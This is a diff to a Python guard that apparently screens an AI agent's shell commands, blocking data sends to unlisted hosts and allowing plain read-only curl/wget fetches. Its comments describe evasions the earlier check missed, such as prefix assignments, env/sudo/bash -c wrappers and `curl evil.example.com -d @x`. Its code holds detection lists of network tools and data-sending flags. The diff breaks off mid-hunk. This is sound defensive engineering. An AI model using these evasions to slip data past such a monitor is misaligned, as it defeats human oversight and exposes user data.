@@ -56,7 +56,7 @@ from urllib.parse import urlsplit
 # for the reason its own docstring gives: two copies of "what counts as inert"
 # drift silently, because each copy still passes its own tests.
 sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
-from cmd_text import strip_inert_text  # noqa: E402
+from cmd_text import SHELL_BOUNDARIES, shell_operands, shell_tokens, strip_inert_text  # noqa: E402
 # Shared with hooks/record-home-gate.py, which refuses the FILE-TOOL spelling of
 # the same write. One memory, so a record refused through either door is
 # recognised at the other (rule 76a53dfe).
@@ -163,6 +163,8 @@ KNOWN_HOSTS = (
     # strip the link, which quietly drops the attribution it exists to give.
     "arxiv.org", "anthropic.com", "claude.com", "humanlayer.dev", "mem0.ai",
     "langchain.com", "emergentmind.com",
+    # Official vendor announcements and developer/API documentation.
+    "openai.com", "developers.openai.com", "platform.openai.com",
     # TypeSafe, added 2026-09-17 on Joe's ruling. docs.typesafe.ai is the
     # documentation host and is a plain research read like the row above it;
     # api.typesafe.ai is the inference endpoint for Jev, a model that takes text
@@ -662,19 +664,48 @@ RULES = [
 # still broken. The loop names the right fix and this is it: decide from the
 # command's EXECUTABLE first, and only then look at hostnames.
 #
-# THE SENDER TEST. A sender name counts only in COMMAND POSITION — at the start of
-# the command, or after a pipe, semicolon, `&&`, `||`, a subshell opener, or one
-# of the usual prefix words (sudo/env/xargs/time/nohup) — optionally with a
-# leading path. That is what keeps `https` in `"see https://example.com"` from
-# matching while `curl`, `/usr/bin/curl` and `... | xargs curl` all still do.
-# `http`/`https` REMAIN senders in command position, because httpie's client is
-# literally named `http` and dropping it would open a real hole.
+# THE SENDER TEST. A sender name counts only as the EXECUTABLE a simple command
+# runs, optionally with a leading path. That is what keeps `https` in
+# `"see https://example.com"` from matching while `curl`, `/usr/bin/curl` and
+# `... | xargs curl` all still do. `http`/`https` REMAIN senders, because
+# httpie's client is literally named `http` and dropping it would open a real hole.
+#
+# WHAT "THE EXECUTABLE" MEANS is decided by normalising command position, not by
+# listing spellings (2026-10-08). The first version matched a sender only at the
+# start of a command or straight after a bare prefix word, so `X=1 curl -d ...`,
+# `env -i curl -d ...`, `env X=1 curl -d ...` and `timeout 5 curl -d ...` hid
+# the sender, and a data-sending curl to an unlisted host was ALLOWED; so were
+# the same sends inside `bash -c '...'`, `eval '...'` and after `then`/`do`.
+# Command position is now found the way the shell finds it (command_executables):
+#   - leading VAR=value assignments are skipped;
+#   - shell keywords that introduce a command (then, do, if, ! ...) are skipped;
+#   - a WRAPPER, a program that runs another command (env, sudo, timeout, nice,
+#     time, xargs ...), makes EVERY later word a candidate executable, because
+#     each wrapper takes its own options and option values and a parser that
+#     guessed them would be one unknown flag away from a hole; a later word
+#     holding spaces is a quoted command string and is read as a command;
+#   - the string a shell runs with -c, and the words eval runs, are commands too.
+# It reads the command twice: as properly quoted shell words, and as raw text
+# split at every boundary character, so a command substitution or backtick
+# inside a quoted string is still seen. Either reading finding a sender is
+# enough. Over-reading costs only the plain-fetch check below; under-reading
+# lets a send through.
 SENDER = (r"curl|wget|nc|ncat|netcat|telnet|ftp|sftp|scp|rsync|ssh|httpie|http|https"
           r"|links|lynx|w3m|aria2c|axel|fetch")
-SEND_CTX = re.compile(
-    r"(?:^|[|;&(){}`\n]|\$\(|&&|\|\||\bsudo\b|\bxargs\b|\benv\b|\btime\b|\bnohup\b|\bdoas\b)"
-    r"\s*(?:[\w./-]*/)?(?:" + SENDER + r")\b",
-    re.I)
+_SENDER_NAMES = frozenset(SENDER.lower().split("|"))
+# Programs whose job is to run another command given as their arguments.
+COMMAND_WRAPPERS = frozenset({
+    "xargs", "sudo", "doas", "env", "time", "nohup", "command", "exec", "builtin",
+    "watch", "timeout", "gtimeout", "parallel", "nice", "renice", "ionice", "stdbuf",
+    "setsid", "caffeinate", "unbuffer", "flock", "chronic", "chroot", "taskset", "chrt",
+    "script", "nsenter", "unshare", "firejail", "proxychains", "proxychains4", "torsocks",
+    "sandbox-exec", "arch", "su", "runuser", "pkexec", "coproc"})
+# Shell reserved words after which the next word is in command position.
+_COMMAND_KEYWORDS = frozenset({"then", "do", "else", "elif", "if", "while", "until",
+                               "!", "{"})
+_SHELLS = re.compile(r"^(?:ba|z|da|k|c|tc|fi|mk)?sh$")
+_ASSIGNMENT = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*(?:\[[^]]*\])?\+?=")
+_RAW_BOUNDARY = re.compile(r"[|;&(){}`\n]")
 
 # AN INTERPRETER THAT IMPORTS A NETWORK CLIENT IS ALSO A SENDER, and this half is
 # what keeps the narrower executable test from becoming a hole: `python3 -c "import
@@ -759,21 +790,329 @@ def is_sql_context(cmd):
     return bool(SQL_CONTEXT.search(cmd))
 
 
-def hosts_in(cmd):
-    """Every host this command could reach: URL hosts plus remote-copy targets."""
-    hosts = []
-    from cmd_text import shell_tokens
+_URL_IN_TOKEN = re.compile(r'https?://[^\s\'"<>]+', re.I)
+
+
+def urls_in(cmd):
+    """Every URL this command names: each http(s) URL in its shell words, plus
+    every destination a curl or wget in it is given WITHOUT a scheme (see
+    fetch_targets), written as `http://<target>` the way both tools read it."""
     try:
         tokens = shell_tokens(cmd)
     except ValueError:
         tokens = re.split(r'[\s;&|]', cmd)
-    for token in tokens:
-        for url in re.findall(r'https?://[^\s\'"<>]+', token, re.I):
-            try:
-                hosts.append(urlsplit(url).hostname or "invalid-url")
-            except ValueError:
-                hosts.append("invalid-url")
-    return hosts + REMOTE_TARGET_RE.findall(cmd)
+    urls = [url for token in tokens for url in _URL_IN_TOKEN.findall(token)]
+    for exe, args in invocations_in(cmd):
+        if exe in READ_ONLY_FETCHERS:
+            urls += [t for t in fetch_targets(exe, args) if t not in urls]
+    return urls
+
+
+def url_host(url):
+    """The URL's hostname, or "invalid-url" when it has none or does not parse."""
+    try:
+        return urlsplit(url).hostname or "invalid-url"
+    except ValueError:
+        return "invalid-url"
+
+
+def hosts_in(cmd):
+    """Every host this command could reach: URL hosts plus remote-copy targets."""
+    return [url_host(url) for url in urls_in(cmd)] + REMOTE_TARGET_RE.findall(cmd)
+
+
+# ── A DESTINATION WITHOUT A SCHEME (2026-10-08) ───────────────────────────────
+#
+# curl and wget read a bare `evil.example.com/path` as a URL. The host check
+# above used to see only `http(s)://` text, so `curl evil.example.com -d @x`
+# named no host, had nothing to fail, and the send went through. So every
+# operand of a curl or wget that can carry a destination is read as one: each
+# positional operand that parses as a host (a dotted name, an IP, a single
+# label, with optional user@, :port and path), the value of --url, and the
+# values of the options that ROUTE the request somewhere else (a proxy,
+# --connect-to, --resolve, --doh-url), because a body sent through an
+# unlisted proxy has reached that proxy. Option values are skipped by the same
+# arity tables the plain-fetch check uses, so `-o page.html` is a file name,
+# not a host; a numeric word (`--max-time 10` if an arity were ever missed) is
+# never read as a host.
+_HOSTLIKE = re.compile(
+    r"^(?:[^@/\s:]+(?::[^@/\s]*)?@)?"
+    r"(?:\[[0-9A-Fa-f:.]+\]|[A-Za-z0-9](?:[A-Za-z0-9-]*[A-Za-z0-9])?"
+    r"(?:\.[A-Za-z0-9](?:[A-Za-z0-9-]*[A-Za-z0-9])?)*\.?)"
+    r"(?::\d*)?(?:[/?#].*)?$")
+_ROUTE_LONG = frozenset({"url", "proxy", "preproxy", "proxy1.0", "socks4", "socks4a", "socks5",
+                         "socks5-hostname", "doh-url", "connect-to", "resolve"})
+_CURL_ARG_LONG = frozenset({
+    "abstract-unix-socket", "alt-svc", "aws-sigv4", "cacert", "capath", "cert", "cert-type",
+    "ciphers", "config", "connect-timeout", "connect-to", "continue-at", "cookie", "cookie-jar",
+    "create-file-mode", "crlfile", "curves", "data", "data-ascii", "data-binary", "data-raw",
+    "data-urlencode", "delegation", "dns-interface", "dns-ipv4-addr", "dns-ipv6-addr",
+    "dns-servers", "doh-url", "dump-header", "ech", "egd-file", "engine", "etag-compare",
+    "etag-save", "expect100-timeout", "form", "form-escape", "form-string", "ftp-account",
+    "ftp-alternative-to-user", "ftp-method", "ftp-port", "ftp-ssl-ccc-mode",
+    "happy-eyeballs-timeout-ms", "haproxy-clientip", "header", "hostpubmd5", "hostpubsha256",
+    "hsts", "interface", "ip-tos", "ipfs-gateway", "json", "keepalive-cnt", "keepalive-time",
+    "key", "key-type", "krb", "libcurl", "limit-rate", "local-port", "login-options",
+    "mail-auth", "mail-from", "mail-rcpt", "max-filesize", "max-redirs", "max-time",
+    "netrc-file", "noproxy", "oauth2-bearer", "output", "output-dir", "parallel-max", "pass",
+    "pinnedpubkey", "preproxy", "proto", "proto-default", "proto-redir", "proxy",
+    "proxy-cacert", "proxy-capath", "proxy-cert", "proxy-cert-type", "proxy-ciphers",
+    "proxy-crlfile", "proxy-header", "proxy-key", "proxy-key-type", "proxy-pass",
+    "proxy-pinnedpubkey", "proxy-service-name", "proxy-tls13-ciphers", "proxy-tlsauthtype",
+    "proxy-tlspassword", "proxy-tlsuser", "proxy-user", "proxy1.0", "pubkey", "quote",
+    "random-file", "range", "rate", "referer", "request", "request-target", "resolve",
+    "retry", "retry-delay", "retry-max-time", "sasl-authzid", "service-name", "sigalgs",
+    "socks4", "socks4a", "socks5", "socks5-gssapi-service", "socks5-hostname", "speed-limit",
+    "speed-time", "stderr", "telnet-option", "tftp-blksize", "time-cond", "tls-max",
+    "tls13-ciphers", "tlsauthtype", "tlspassword", "tlsuser", "trace", "trace-ascii",
+    "trace-config", "unix-socket", "upload-file", "upload-flags", "url", "url-query", "user",
+    "user-agent", "variable", "write-out"})
+_WGET_ARG_LONG = frozenset({
+    "accept", "accept-regex", "append-output", "ask-password", "backups", "base",
+    "bind-address", "bind-dns-address", "body-data", "body-file", "ca-certificate",
+    "ca-directory", "certificate", "certificate-type", "ciphers", "compression", "config",
+    "connect-timeout", "crl-file", "cut-dirs", "default-page", "directory-prefix",
+    "dns-servers", "dns-timeout", "domains", "exclude-directories", "exclude-domains",
+    "execute", "ftp-password", "ftp-user", "header", "hsts-file", "http-password",
+    "http-user", "include-directories", "input-file", "level", "limit-rate", "load-cookies",
+    "local-encoding", "max-redirect", "method", "output-document", "output-file", "password",
+    "pinnedpubkey", "post-data", "post-file", "prefer-family", "private-key",
+    "private-key-type", "progress", "proxy-password", "proxy-user", "quota", "random-file",
+    "read-timeout", "referer", "regex-type", "reject", "reject-regex", "rejected-log",
+    "remote-encoding", "report-speed", "restrict-file-names", "retry-on-http-error",
+    "save-cookies", "secure-protocol", "timeout", "tries", "use-askpass", "user",
+    "user-agent", "wait", "waitretry", "warc-cdx", "warc-dedup", "warc-file", "warc-header",
+    "warc-max-size", "warc-tempdir"})
+
+
+def _as_url(word):
+    return word if "://" in word else f"http://{word}"
+
+
+def _route_targets(name, value):
+    """Destinations carried by a routing option's value."""
+    if name in ("connect-to", "resolve"):
+        # HOST1:PORT1:HOST2:PORT2 / HOST:PORT:ADDR[,ADDR] — every name or address in it.
+        fields = re.split(r"[:,]", value.strip("[]"))
+        return [_as_url(f) for f in fields if f and not f.isdigit() and _HOSTLIKE.match(f)]
+    return [_as_url(value)] if value and _HOSTLIKE.match(value.split("://", 1)[-1]) else []
+
+
+def fetch_targets(tool, words):
+    """Every destination one curl/wget invocation is given without an http(s)
+    scheme, as `http://...` URLs (see A DESTINATION WITHOUT A SCHEME)."""
+    arg_long = _CURL_ARG_LONG if tool == "curl" else _WGET_ARG_LONG
+    arg_short = _CURL_ARG_SHORT if tool == "curl" else _WGET_ARG_SHORT
+    targets, i, operands_only = [], 0, False
+    while i < len(words):
+        w = words[i]
+        i += 1
+        if not operands_only and w == "--":
+            operands_only = True
+        elif not operands_only and w.startswith("--") and len(w) > 2:
+            name, eq, value = w[2:].partition("=")
+            name = name.lower()
+            if name in arg_long or name in _ROUTE_LONG:
+                if not eq and i < len(words):
+                    value = words[i]
+                    i += 1
+                if name in _ROUTE_LONG:
+                    targets += _route_targets(name, value)
+        elif not operands_only and w.startswith("-") and len(w) > 1:
+            cluster = w[1:]
+            for k, ch in enumerate(cluster):
+                if ch in arg_short:
+                    value = cluster[k + 1:]
+                    if not value and i < len(words):
+                        value = words[i]
+                        i += 1
+                    if tool == "curl" and ch == "x":
+                        targets += _route_targets("proxy", value)
+                    break
+        elif not re.match(r"https?://", w, re.I) and not w.isdigit() and _HOSTLIKE.match(w):
+            targets.append(_as_url(w))
+    return targets
+
+
+def _exe_name(word):
+    """A word read as an executable name: path and stray quoting removed, lowercased."""
+    return os.path.basename(word.strip("'\"\\")).lower()
+
+
+def _shell_c_script(words):
+    """The script a shell runs with -c (`bash -c`, `sh -ec`), or None."""
+    for k, w in enumerate(words[:-1]):
+        if w.startswith("-") and not w.startswith("--") and "c" in w:
+            return words[k + 1]
+    return None
+
+
+# Option grammar of the wrappers whose program position can be computed:
+# (short options taking a value, short flags, long options taking a value,
+#  long flags, operands before the program, pattern each operand must match).
+# A wrapper missing here, or any option missing from its entry, means the
+# program position is unknown, and the caller then reads every word as a
+# candidate. Under-modelling an option would hide the sender behind it, so an
+# unknown option fails closed rather than being guessed at.
+_DURATION = r"\d+(?:\.\d+)?[smhd]?"
+_WRAPPER_GRAMMAR = {
+    "timeout": ("sk", "v", {"--signal", "--kill-after"},
+                {"--preserve-status", "--foreground", "--verbose"}, 1, _DURATION),
+    "gtimeout": ("sk", "v", {"--signal", "--kill-after"},
+                 {"--preserve-status", "--foreground", "--verbose"}, 1, _DURATION),
+    "nohup": ("", "", set(), set(), 0, None),
+    "nice": ("n", "", {"--adjustment"}, set(), 0, None),
+    "env": ("uCSP", "i0v", {"--unset", "--chdir", "--split-string"},
+            {"--ignore-environment", "--null", "--debug"}, 0, None),
+    "sudo": ("ughprtUCDT", "AbBEeHiKklNnPSsVv",
+             {"--user", "--group", "--host", "--prompt", "--role", "--type",
+              "--other-user", "--close-from", "--chdir", "--command-timeout"},
+             {"--preserve-env", "--login", "--shell", "--non-interactive",
+              "--stdin", "--background", "--set-home", "--askpass", "--bell",
+              "--reset-timestamp", "--remove-timestamp"}, 0, None),
+    "flock": ("wEc", "sxnuoFh",
+              {"--timeout", "--wait", "--conflict-exit-code", "--command"},
+              {"--shared", "--exclusive", "--nonblock", "--nb", "--unlock",
+               "--close", "--no-fork", "--verbose"}, 1, None),
+    "chroot": ("", "", {"--userspec", "--groups"}, {"--skip-chdir"}, 1, None),
+    "xargs": ("aEIdLnPsJRS", "0oprtxie",
+              {"--arg-file", "--delimiter", "--eof", "--replace", "--max-lines",
+               "--max-args", "--max-procs", "--max-chars"},
+              {"--null", "--open-tty", "--interactive", "--no-run-if-empty",
+               "--verbose", "--exit", "--show-limits"}, 0, None),
+    "sandbox-exec": ("fnpD", "", set(), set(), 0, None),
+    "time": ("of", "pal", {"--output", "--format"},
+             {"--portability", "--append", "--verbose"}, 0, None),
+    "ionice": ("cnp", "t", {"--class", "--classdata", "--pid"},
+               {"--ignore"}, 0, None),
+}
+
+
+def _wrapped_program(exe, rest):
+    """Index in `rest` of the program wrapper `exe` runs, or None when the
+    position cannot be computed for certain (see _WRAPPER_GRAMMAR)."""
+    grammar = _WRAPPER_GRAMMAR.get(exe)
+    if grammar is None:
+        return None
+    short_value, short_flag, long_value, long_flag, operands, operand_re = grammar
+    i = 0
+    while i < len(rest):
+        w = rest[i]
+        if w == "--":
+            i += 1
+            break
+        if w.startswith("--"):
+            name = w.split("=", 1)[0]
+            if name not in long_value and name not in long_flag:
+                return None
+            i += 2 if (name in long_value and "=" not in w) else 1
+            continue
+        if w.startswith("-") and len(w) > 1:
+            if exe == "nice" and w[1:].isdigit():
+                i += 1
+                continue
+            takes_next = False
+            for j, c in enumerate(w[1:], 1):
+                if c in short_value:
+                    takes_next = j == len(w) - 1
+                    break
+                if c not in short_flag:
+                    return None
+            i += 2 if takes_next else 1
+            continue
+        if exe == "env" and _ASSIGNMENT.match(w):
+            i += 1
+            continue
+        break
+    for _ in range(operands):
+        if i >= len(rest) or (operand_re and not re.fullmatch(operand_re, rest[i])):
+            return None
+        i += 1
+    if i >= len(rest) or rest[i].startswith("-"):
+        return None
+    return i
+
+
+def command_invocations(words, depth=0):
+    """Every (executable, its argument words) one simple command could run,
+    after normalising command position (see THE SENDER TEST)."""
+    i = 0
+    while i < len(words) and (_ASSIGNMENT.match(words[i]) or words[i] in _COMMAND_KEYWORDS):
+        i += 1
+    if i >= len(words):
+        return []
+    exe, rest = _exe_name(words[i]), words[i + 1:]
+    found = [(exe, rest)]
+    if exe in COMMAND_WRAPPERS:
+        # A word with spaces is a quoted command string (`su -c '...'`,
+        # `sudo sh -c '...'`, `watch '...'`), so it is read as a command.
+        # Every other word is a candidate program, because a wrapper's option
+        # values and operands (`sudo -D /tmp`, `flock /tmp/lk`) can sit in front
+        # of the sender. The scan stops only where _wrapped_program places the
+        # program at a path or at another wrapper: the words after it are that
+        # program's arguments (`timeout 30 ./run.sh fetch <url>`). Past the
+        # recursion cap it does not stop at all, so deep nesting reads every word.
+        p = _wrapped_program(exe, rest)
+        stop = p if p is not None and ("/" in rest[p] or
+                                       _exe_name(rest[p]) in COMMAND_WRAPPERS) else None
+        for k, w in enumerate(rest):
+            if any(c.isspace() for c in w):
+                found += invocations_in(w, depth + 1) if depth < 4 else []
+            elif "://" in w:
+                continue
+            elif k == stop and depth < 4:
+                found += command_invocations(rest[k:], depth + 1)
+                break
+            else:
+                found.append((_exe_name(w), rest[k + 1:]))
+        return found
+    script = " ".join(rest) if exe == "eval" else (
+        _shell_c_script(rest) if _SHELLS.match(exe) else None)
+    if script and depth < 4:
+        found += invocations_in(script, depth + 1)
+    return found
+
+
+def command_executables(words, depth=0):
+    """The executable names of command_invocations."""
+    return [exe for exe, _ in command_invocations(words, depth)]
+
+
+def _command_words(segment):
+    """Shell words of one raw segment; unbalanced quoting falls back to splitting."""
+    try:
+        words = shlex.split(segment, posix=True)
+    except ValueError:
+        words = [w.strip("'\"") for w in segment.split()]
+    return _without_redirects(words)
+
+
+def _without_redirects(words):
+    words = [w for w in words if w not in ("(", ")", "{", "}")]
+    try:
+        return shell_operands(words)[0]
+    except ValueError:
+        return words
+
+
+def invocations_in(cmd, depth=0):
+    """Every (executable, argument words) `cmd` could run, from both the
+    quoted-word reading and the raw boundary-split reading (see THE SENDER TEST)."""
+    found = []
+    try:
+        tokens = shell_tokens(cmd)
+    except ValueError:
+        tokens = []
+    segment = []
+    for token in tokens + [";"]:
+        if token in SHELL_BOUNDARIES:
+            found += command_invocations(_without_redirects(segment), depth)
+            segment = []
+        else:
+            segment.append(token)
+    for raw in _RAW_BOUNDARY.split(cmd):
+        found += command_invocations(_command_words(raw), depth)
+    return found
 
 
 def is_send_context(cmd):
@@ -783,7 +1122,218 @@ def is_send_context(cmd):
     position, or an interpreter that references a network client library. A
     command that merely quotes a URL matches neither.
     """
-    return bool(SEND_CTX.search(cmd) or NET_CLIENT.search(cmd))
+    return bool(NET_CLIENT.search(cmd)
+                or _SENDER_NAMES.intersection(exe for exe, _ in invocations_in(cmd)))
+
+# ── THE PLAIN READ-ONLY FETCH (Joe, 2026-10-07) ──────────────────────────────
+#
+# Joe: research should "use the full internet". Until this ruling the Bash path
+# was allowlist-only for EVERY curl, because curl picks its own method and body
+# and so a host list was the only control. That is right for a command that can
+# SEND and wrong for one that can only READ: a GET or a download whose only
+# outbound bytes are a URL carries no more than WebFetch's open-read class does.
+#
+# So an unlisted host is allowed when the whole command is a plain read-only
+# fetch, decided from what the command SAYS — nothing here resolves DNS or runs
+# anything:
+#   - every network executable in command position is curl or wget, called
+#     directly (not through xargs/sudo/env, which hide the URL or the method);
+#   - no flag that sends: a body, a form, an upload, a non-GET/HEAD method, a
+#     header, a cookie, a credential, a config file, an input file of URLs, or
+#     curl's file-reading variables;
+#   - nothing the guard cannot read: no $-expansion, backtick or process
+#     substitution anywhere in the command, so the URL seen is the URL sent;
+#   - no interpreter network client and no scp/rsync remote target;
+#   - every unlisted URL passes webfetch_open_read_reason: the length and query
+#     caps, no secret or blob in the query, no credentials, a standard port, and
+#     a public DNS name (no IP, loopback, metadata or private suffix).
+# Anything else falls back to the allowlist, exactly as before.
+#
+# LIMITS, stated plainly. This judges flags lexically, the same way every other
+# rule here does; it does not chase obfuscation. A URL path can still carry up to
+# the open-read cap of text, which is the same residual channel WebFetch has had
+# since 2026-08-09. DNS rebinding is not caught, as for WebFetch. Unlike WebFetch,
+# curl -L and wget follow redirects, so a public host can bounce a GET to a
+# loopback address; that GET still carries only the URL out, and its response
+# comes back to this session, not to the host — the same accepted residual.
+READ_ONLY_FETCHERS = frozenset({"curl", "wget"})
+_UNREADABLE = re.compile(r"[`]|\$[({A-Za-z_0-9@*#?$!-]|<\(|>\(")
+_CURL_SEND_LONG = frozenset({
+    "data", "data-ascii", "data-binary", "data-raw", "data-urlencode", "json",
+    "form", "form-string", "form-escape", "upload-file", "header", "proxy-header",
+    "user", "proxy-user", "cookie", "config", "url-query", "oauth2-bearer",
+    "aws-sigv4", "variable", "mail-from", "mail-rcpt", "telnet-option", "netrc-file",
+    "netrc", "netrc-optional", "delegation", "negotiate", "ntlm", "digest", "anyauth",
+    "basic", "cert", "key", "pass", "upload-flags"})
+_CURL_SEND_SHORT = frozenset("bdFHKTu")
+# curl short options that consume the rest of the cluster (or the next word) as
+# their value, so the letters after them are a value, not more options.
+_CURL_ARG_SHORT = frozenset("AbcCdDeEFHKmoQrtTuUwxXYyz")
+_WGET_SEND_LONG = frozenset({
+    "post-data", "post-file", "body-data", "body-file", "method", "header",
+    "input-file", "user", "password", "http-user", "http-password", "ftp-user",
+    "ftp-password", "proxy-user", "proxy-password", "load-cookies", "config",
+    "execute", "use-askpass", "ask-password", "certificate", "private-key"})
+_WGET_SEND_SHORT = frozenset("ei")
+_WGET_ARG_SHORT = frozenset("aABDeiIlOoPQRtTUwX")
+_READ_METHODS = frozenset({"GET", "HEAD"})
+# Flags naming a local file the fetch WRITES. Bytes from an unlisted host are
+# untrusted, so where they land is checked (_safe_fetch_output).
+_CURL_OUT_LONG = frozenset({"output", "output-dir", "dump-header", "cookie-jar", "trace",
+                            "trace-ascii", "stderr", "libcurl", "etag-save", "hsts", "alt-svc"})
+_CURL_OUT_SHORT = frozenset("oDc")
+_WGET_OUT_LONG = frozenset({"output-document", "output-file", "append-output",
+                            "directory-prefix", "save-cookies"})
+_WGET_OUT_SHORT = frozenset("OoaP")
+# Fetched text piped into one of these runs code from a host nobody vetted.
+_INTERPRETER = re.compile(r"^(?:(?:ba|z|da|k|c|tc|fi)?sh|python[0-9.]*|node|deno|bun|perl|ruby|"
+                          r"php|osascript|lua|tclsh|source|eval|\.)$")
+_SAFE_DEVICES = frozenset({"/dev/null", "/dev/stdout", "/dev/stderr", "-"})
+_SAFE_ABS_PREFIXES = ("/tmp/", "/private/tmp/", "/var/folders/")
+
+
+def _safe_fetch_output(path, cwd=None):
+    """True if untrusted downloaded bytes may land at `path`: a harmless device,
+    a temp directory, or a NEW file below the working directory. Never ~, any
+    other absolute path, a `..` climb, a dotfile (shell rc, .git, .claude), or an
+    existing file there — a download creates, it does not overwrite a script."""
+    if path in _SAFE_DEVICES:
+        return True
+    if path.startswith(_SAFE_ABS_PREFIXES):
+        return ".." not in path.split("/")
+    if not path or path.startswith(("/", "~")):
+        return False
+    if any(part == ".." or (part.startswith(".") and part != ".") for part in path.split("/")):
+        return False
+    full = os.path.join(cwd or os.getcwd(), path)
+    return os.path.isdir(full) or not os.path.lexists(full)
+
+
+def _fetch_flag_refusal(tool, words, cwd=None):
+    """None when every flag of one curl/wget invocation is read-only and every
+    file it writes is a safe place for untrusted bytes."""
+    send_long = _CURL_SEND_LONG if tool == "curl" else _WGET_SEND_LONG
+    send_short = _CURL_SEND_SHORT if tool == "curl" else _WGET_SEND_SHORT
+    arg_short = _CURL_ARG_SHORT if tool == "curl" else _WGET_ARG_SHORT
+    out_long = _CURL_OUT_LONG if tool == "curl" else _WGET_OUT_LONG
+    out_short = _CURL_OUT_SHORT if tool == "curl" else _WGET_OUT_SHORT
+    outputs = []
+    remote_name = False
+    i = 0
+    while i < len(words):
+        w = words[i]
+        i += 1
+        if w.startswith("--") and len(w) > 2:
+            name, eq, value = w[2:].partition("=")
+            name = name.lower()
+            if name in send_long or name.startswith("expand-"):
+                return f"{tool} --{name} sends data"
+            if tool == "curl" and name == "remote-header-name":
+                return "curl --remote-header-name lets the server name the file it writes"
+            if tool == "curl" and name in ("remote-name", "remote-name-all"):
+                remote_name = True
+            if name in ("request", "method") or name in out_long:
+                if not eq and i < len(words):
+                    value = words[i]
+                    i += 1
+                if name in out_long:
+                    outputs.append(value)
+                elif value.upper() not in _READ_METHODS:
+                    return f"{tool} method {value or '(none)'} is not a read"
+        elif w.startswith("-") and len(w) > 1:
+            cluster = w[1:]
+            for k, ch in enumerate(cluster):
+                if ch in send_short:
+                    return f"{tool} -{ch} sends data"
+                if tool == "curl" and ch == "J":
+                    return "curl -J lets the server name the file it writes"
+                if tool == "curl" and ch == "O":
+                    remote_name = True
+                if ch in arg_short:
+                    value = cluster[k + 1:]
+                    if not value and i < len(words):
+                        value = words[i]
+                        i += 1
+                    if tool == "curl" and ch == "X" and value.upper() not in _READ_METHODS:
+                        return f"curl method {value or '(none)'} is not a read"
+                    if ch in out_short:
+                        outputs.append(value)
+                    break
+    if remote_name:
+        # curl -O names the file after the URL's last path segment, and overwrites.
+        outputs += [urlsplit(w).path.rsplit("/", 1)[-1]
+                    for w in words + fetch_targets(tool, words) if re.match(r"https?://", w, re.I)]
+    for path in outputs:
+        if not _safe_fetch_output(path, cwd):
+            return f"{tool} would write fetched bytes to {path or '(none)'}"
+    return None
+
+
+def read_only_fetch_refusal(cmd, cwd=None):
+    """None if `cmd` is a plain read-only fetch whose unlisted URLs all pass the
+    open-read policy; otherwise the reason it is not."""
+    if NET_CLIENT.search(cmd):
+        return "an interpreter network client is not a plain fetch"
+    if _UNREADABLE.search(cmd):
+        return "the command carries a $-expansion, backtick or process substitution the guard cannot read"
+    if REMOTE_TARGET_RE.search(cmd):
+        return "a remote copy target is a send"
+    try:
+        tokens = shell_tokens(cmd)
+    except ValueError:
+        return "the command could not be parsed"
+    segments, current = [], []
+    for t in tokens:
+        if t in SHELL_BOUNDARIES:
+            segments.append(current)
+            current = []
+        else:
+            current.append(t)
+    segments.append(current)
+    fetches = 0
+    for seg in segments:
+        words = [w for w in seg if w not in ("(", ")", "{", "}")]
+        while words and (_ASSIGNMENT.match(words[0]) or words[0] in _COMMAND_KEYWORDS):
+            words = words[1:]
+        try:
+            words, redirects = shell_operands(words)
+        except ValueError:
+            return "the command could not be parsed"
+        for path in redirects:
+            if not _safe_fetch_output(path, cwd):
+                return f"the command would write fetched bytes to {path}"
+        if not words:
+            continue
+        exe = os.path.basename(words[0]).lower()
+        if exe in ("cd", "pushd"):
+            # Follow a directory change so an output path is judged where it lands.
+            target = os.path.expanduser(words[1]) if len(words) > 1 else os.path.expanduser("~")
+            cwd = os.path.join(cwd or os.getcwd(), target)
+            continue
+        if _INTERPRETER.match(exe):
+            return f"{exe} in a fetch command could run what the fetch returns"
+        if exe == "tee" and not all(_safe_fetch_output(a, cwd) for a in words[1:] if not a.startswith("-")):
+            return "tee would write fetched bytes over a file or outside the working directory"
+        if exe in COMMAND_WRAPPERS and _SENDER_NAMES.intersection(command_executables(words)):
+            return f"a network client run through {exe} is not a plain fetch"
+        if exe not in _SENDER_NAMES:
+            continue
+        if exe not in READ_ONLY_FETCHERS:
+            return f"{exe} is not a plain fetch"
+        why = _fetch_flag_refusal(exe, words[1:], cwd)
+        if why:
+            return why
+        fetches += 1
+    if not fetches:
+        return "no curl or wget fetch in command position"
+    for url in urls_in(cmd):
+        if host_allowlisted(url_host(url)):
+            continue
+        why = webfetch_open_read_reason(url)
+        if why:
+            return why.replace("WebFetch ", "the fetch ").split(" — blocked")[0]
+    return None
+
 
 # ── THE DERIVED HOST LIST (2026-08-09, the "B" half of Joe's "build A and B") ─
 #
@@ -860,8 +1410,10 @@ def host_allowlisted(host):
 #
 # The guard's own stated job (see the header, class 4) is the EXFILTRATION
 # guard. A GET whose entire outbound payload is a URL is a different risk from a
-# POST that can carry a database, so it gets a different policy. KNOWN_HOSTS is
-# untouched and still governs Bash.
+# POST that can carry a database, so it gets a different policy. KNOWN_HOSTS
+# still governs every Bash command that SENDS; since 2026-10-07 a Bash curl/wget
+# that is a plain read-only fetch gets this same per-URL policy (see THE PLAIN
+# READ-ONLY FETCH above).
 #
 # WHAT THIS BUYS. Client verification needs the practice's own website, and
 # practice websites cannot be enumerated — there is a different one per client,
@@ -1176,7 +1728,7 @@ def direct_metered_dispatch(cmd):
         (re.compile(r"\bneonctl\b[^\n;&|]*\bbranches\s+create\b", re.I),
          "direct Neon branch create bypasses neon-disposable-branch admission"),
         (re.compile(r"\bgh\s+(?:workflow\s+run|run\s+rerun)\b", re.I),
-         "direct GitHub Actions dispatch bypasses the remote-CI budget gate"),
+         "direct GitHub Actions dispatch bypasses the remote-CI budget gate (job retry: ops/ci-rerun.sh RUN_ID --job JOB_ID)"),
     )
     for pattern, reason in patterns:
         if pattern.search(executable):
@@ -1372,17 +1924,19 @@ def check(cmd, cwd=None):
             return f"{label} — blocked by the CARR unattended guard"
 
     if is_send_context(cmd):
-        for host in hosts_in(cmd):
-            # host_allowlisted covers KNOWN_HOSTS plus the record-derived client
-            # and lead domains. The Bash path gets NO equivalent of the WebFetch
-            # open-read class and must not: curl chooses its own method and body,
-            # so the length cap that makes an open GET safe buys nothing here.
-            # This path stays allowlist-only, by design.
-            if not host_allowlisted(host):
-                return (f"network send to an unrecognised host ({host}) — blocked by the "
-                        f"CARR unattended guard. Add it to KNOWN_HOSTS if it is legitimate, "
-                        f"or — if it is a client's own domain — check that they carry a "
-                        f"practice email and re-run ops/fetch-allowlist.py.")
